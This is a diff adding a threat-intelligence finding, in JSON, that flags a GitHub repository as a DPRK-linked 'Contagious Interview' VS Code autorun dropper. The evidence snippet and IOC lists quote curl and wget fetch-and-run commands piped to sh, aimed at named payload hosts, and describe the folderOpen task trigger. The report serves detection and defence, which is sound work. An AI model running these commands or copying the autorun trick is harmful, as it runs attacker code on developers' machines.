@@ -1,0 +1,64 @@
+{
+  "finding": {
+    "key": "repository:alpascal1010/genetiq-beta",
+    "kind": "repository",
+    "family": "",
+    "id": "alpascal1010/genetiq-beta",
+    "url": "https://github.com/AlPascal1010/genetiq-beta/",
+    "registry": "github",
+    "owner": "alpascal1010",
+    "status": "confirmed",
+    "confidence": "",
+    "score": 5,
+    "detection_method": "osm_repository",
+    "attribution": "dprk (north korea)",
+    "campaign_id": "GW-C-a3717cc8",
+    "rules": "install_hook/vscode-autorun",
+    "evidence_locations": ".vscode/tasks.json:0",
+    "c2_hosts": "coreviewer.vercel.app",
+    "iocs": "coreviewer.vercel.app; https://coreviewer.vercel.app/task/mac?token=40ae0f7a9f70; https://coreviewer.vercel.app/task/linux?token=40ae0f7a9f70; https://coreviewer.vercel.app/task/windows?token; curl 'https://coreviewer.vercel.app/task/mac?token=40ae0f7a9f70' | sh; .vscode/tasks.json",
+    "matched_signatures": "",
+    "reasons": "OSM-flagged malicious repository (severity CRITICAL) [DPRK (North Korea) (per OSM)]: DPRK Contagious Interview campaign using VS Code tasks.json. Auto-executes malicious payload when VS Code opens folder via runOn: folderOpen trigger or .githook | Tier-2 confirmed (bash score 5)",
+    "osm_status": "not_submitted",
+    "osm_threat_id": "",
+    "first_seen": "hunt-20260707T021635Z",
+    "last_seen": "hunt-20260707T021635Z",
+    "evidence_file": "repositories/alpascal1010_genetiq-beta.json",
+    "reviewer_decision": "",
+    "notes": ""
+  },
+  "evidence": [
+    {
+      "file": ".vscode/tasks.json",
+      "line": 0,
+      "category": "install_hook",
+      "rule": "vscode-autorun",
+      "snippet": "curl 'https://coreviewer.vercel.app/task/mac?token=40ae0f7a9f70' | sh wget -qO- 'https://coreviewer.vercel.app/task/linux?token=40ae0f7a9f70' | sh curl https://coreviewer.vercel.app/task/windows?token"
+    }
+  ],
+  "commit_sha": null,
+  "osm_report": {
+    "report_type": "repository",
+    "resource_identifier": "https://github.com/alpascal1010/genetiq-beta",
+    "version_info": "all",
+    "threat_description": "VS Code autorun dropper. Payload in .vscode/tasks.json.\nOutbound: fetch-and-run. It downloads code from coreviewer.vercel.app and executes it (.vscode/tasks.json).\nRuns automatically when the folder is opened in VS Code (hidden folderOpen task that fetches and runs a remote script).\nMatches PolinRider / Contagious Interview (DPRK): fake-recruiter coding tasks that run a downloader when opened in VS Code. Payload host: coreviewer.vercel.app.\nCampaign GW-C-a3717cc8: one of 20 confirmed repos across 17 accounts sharing the dropper URL shape task/{os}?token=. Payload served from 10 distinct hosts, including codeviewer-three.vercel.app, coreviewer.vercel.app, jerryfox-platform.vercel.app, task-hrec.vercel.app, thopywork.vercel.app.\nAttribution: we assess this repository as PROBABLE North Korea 'Contagious Interview' activity. Signals: Delivery vector matches Contagious-Interview tradecraft: vscode-folderopen-autorun; Payload host is curated known-DPRK / Contagious-Interview infrastructure: coreviewer.vercel.app; Corroboration (not counted toward attribution): OSM/news already names dprk (north korea).\nConfirmed by static analysis; the code was read, never executed.",
+    "payload_description": "Malicious payload found in: .vscode/tasks.json\n- Outbound: fetch-and-run. It downloads code from coreviewer.vercel.app and executes it (.vscode/tasks.json).\n- .vscode/tasks.json: VS Code task with runOn: folderOpen; runs the moment the folder is opened, no install or click needed\n- Attacker hosts: coreviewer.vercel.app",
+    "publisher": "alpascal1010",
+    "severity_level": "critical",
+    "tags": [
+      "supply-chain",
+      "github-repo",
+      "contagious-interview",
+      "fake-recruiter",
+      "dprk",
+      "north-korea",
+      "vscode-folderopen-autorun",
+      "dropper"
+    ],
+    "evidence_references": "https://github.com/alpascal1010/genetiq-beta/blob/HEAD/.vscode/tasks.json",
+    "verified_iocs": "coreviewer.vercel.app\nhttps://coreviewer.vercel.app/task/mac?token=40ae0f7a9f70\nhttps://coreviewer.vercel.app/task/linux?token=40ae0f7a9f70\nhttps://coreviewer.vercel.app/task/windows?token\ncurl 'https://coreviewer.vercel.app/task/mac?token=40ae0f7a9f70' | sh\n.vscode/tasks.json",
+    "contributors": [],
+    "first_seen": "2026-07-07T02:16:35Z",
+    "last_seen": "2026-07-07T02:16:35Z"
+  }
+}
